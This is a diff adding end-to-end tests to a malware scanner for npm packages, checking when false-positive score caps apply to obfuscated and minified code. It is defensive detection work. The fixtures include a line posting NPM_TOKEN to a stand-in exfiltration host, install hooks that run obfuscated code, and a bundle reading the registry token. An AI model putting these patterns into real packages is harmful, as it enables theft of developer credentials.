@@ -1,6 +1,6 @@
 'use strict';
 
-// End-to-end tests of contextual FP caps F3, F5 and F7 through the real CLI (MUADDIB_DEBUG=1
+// End-to-end tests of contextual FP caps F3, F5, F6, F7 and F12 through the real CLI (MUADDIB_DEBUG=1
 // prints the "[FP-CAP] ... <feature>" line; the JSON score is on stdout). F10 has its own
 // file; F13 is covered end to end in tests/audit-2026-05/typosquat-findings.test.js.
 // F11 (ai_agent_bot) is not covered here: its "agent runtime path" condition needs a finding
@@ -99,6 +99,50 @@ async function runE2EFpCapTests() {
   await asyncTest('F7 E2E: same placeholder description with a HIGH finding -> cap does not apply', async () => {
     const s = scanCli({ 'package.json': placeholder, 'index.js': postTo('collector.example-exfil.net', 'NPM_TOKEN') });
     assert(!s.capLine.includes('placeholder_anti_dep_confusion') && s.score > 20, show(s));
+  });
+
+  // ---- F6 obfuscation_without_vector ----
+  // Obfuscator.io-shaped output (rotated string table + index accessor) with no install, env
+  // or network vector -> MAX 35. The obfuscated file alone scores below 35, so these tests
+  // assert that the cap applies, not a score drop.
+  const BS = String.fromCharCode(92);
+  const table = Array.from({ length: 400 }, (_, i) =>
+    "'" + BS + 'x' + (40 + (i * 7) % 50).toString(16) + BS + 'x' + (60 + (i * 3) % 30).toString(16) + "'").join(',');
+  const obfuscated = 'var _0x1a2b=[' + table + "];(function(_0x3c,_0x4d){var _0x5e=function(_0x6f){while(--_0x6f){_0x3c['push'](_0x3c['shift']());}};_0x5e(++_0x4d);}(_0x1a2b,0x1f4));" +
+    'var _0x7a=function(_0x8b){_0x8b=_0x8b-0x0;return _0x1a2b[_0x8b];};module.exports=_0x7a;\n';
+  const obfPkg = scripts => ({ 'package.json': { name: 'protected-lib-x', version: '1.0.0', main: 'index.js', ...(scripts ? { scripts } : {}) }, 'index.js': obfuscated });
+  await asyncTest('F6 E2E: obfuscated library with no install / env / network vector -> cap applies', async () => {
+    const s = scanCli(obfPkg());
+    assert(s.capLine.includes('obfuscation_without_vector') && s.score <= 35, show(s));
+  });
+  await asyncTest('F6 E2E: same obfuscated file run by an install hook -> cap does not apply', async () => {
+    const s = scanCli(obfPkg({ postinstall: 'node index.js' }));
+    assert(!s.capLine.includes('obfuscation_without_vector') && s.score > 35, show(s));
+  });
+
+  // ---- F12 vendor_minified_bundle ----
+  // A minified framework bundle (>= 20 KB, .min.js) where >= 3 bundler-shaped heuristics fire
+  // on the same file (template compilation via new Function / eval, a reactive Proxy that
+  // syncs state, prototype patching) and no install hook -> MAX 25.
+  const bundle = extra => '/* ' + 'x'.repeat(40 * 1024) + ' */\n' +
+    "!function(e){var t=e.tpl,n=new Function('ctx','with(ctx){return '+t+'}');var o=eval(e.expr);" +
+    "var s=new Proxy({},{set:function(o,k,v){o[k]=v;fetch('/api/state',{method:'POST',body:JSON.stringify({k:k,v:v})});return true}});" +
+    'Object.prototype.__reactive=true;' + extra + 'e.out=[n,o,s];}(window.__cfg||{});\n';
+  const bundlePkg = (code, scripts) => ({
+    'package.json': { name: 'vendor-player-x', version: '1.0.0', main: 'lib/player.min.js', ...(scripts ? { scripts } : {}) },
+    'lib/player.min.js': code
+  });
+  await asyncTest('F12 E2E: minified framework bundle, no install hook -> cap applies', async () => {
+    const s = scanCli(bundlePkg(bundle('')));
+    assert(s.capLine.includes('vendor_minified_bundle') && s.score <= 25, show(s));
+  });
+  await asyncTest('F12 E2E: same bundle run by an install hook -> cap does not apply', async () => {
+    const s = scanCli(bundlePkg(bundle(''), { postinstall: 'node lib/player.min.js' }));
+    assert(!s.capLine.includes('vendor_minified_bundle') && s.score > 25, show(s));
+  });
+  await asyncTest('F12 E2E: same bundle reading the registry token -> cap does not apply', async () => {
+    const s = scanCli(bundlePkg(bundle('var tk=process.env.NPM_TOKEN;')));
+    assert(!s.capLine.includes('vendor_minified_bundle') && s.score > 25, show(s));
   });
 }
 
